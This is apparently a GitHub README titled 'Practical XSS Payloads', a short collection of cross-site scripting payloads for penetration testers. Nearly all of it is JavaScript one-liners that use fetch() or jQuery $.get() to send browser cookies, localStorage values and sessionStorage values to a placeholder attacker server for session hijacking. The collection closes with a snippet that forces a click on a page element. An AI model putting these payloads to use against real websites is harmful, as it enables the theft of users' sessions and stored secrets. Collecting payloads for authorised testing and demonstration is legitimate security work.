# Practical XSS Payloads
## About
Instead of using alert() for your XSS payloads, I encourage you to check out some XSS payloads which have purpose and hammer home a point.
+ **TLDR:** *POC||GTFO*

### **Quick-navigation:**
+ **EXFILTRATION:**  
  + [Fetch](https://github.com/Insecurities/PracticalXSSPayloads#fetch)  
  + [.$GET](https://github.com/Insecurities/PracticalXSSPayloads#jquery-ajax)
+ **ACTIONS:**

# EXFILTRATION
*For session hijacking, sensitive info exfil, etc.*
## FETCH
### GET VALUE FROM LOCAL STORAGE AND $FETCH:
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+localStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET VALUE FROM SESSION STORAGE AND $FETCH:
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET COOKIES AND $FETCH
```javascript
fetch("https://$ATTACKER_SERVER/?exfil="+document.cookie)
```
## JQuery AJAX
### GET VALUE FROM LOCAL STORAGE AND $.GET
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+localStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET VALUE FROM SESSION STORAGE AND $.GET:
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))
```
### GET COOKIES AND $.GET
```javascript
$.get("https://$ATTACKER_SERVER/?exfil="+document.cookie)
```  
# FORCING ACTIONS
*For forcing users to preform a certain action. This is tricky because every app is going to be different and thus these will require **modification**.*
## CLICK ELEMENT BY ID
```javascript
document.getElementById("$TARGET_ELEMENT_ID").click()
```
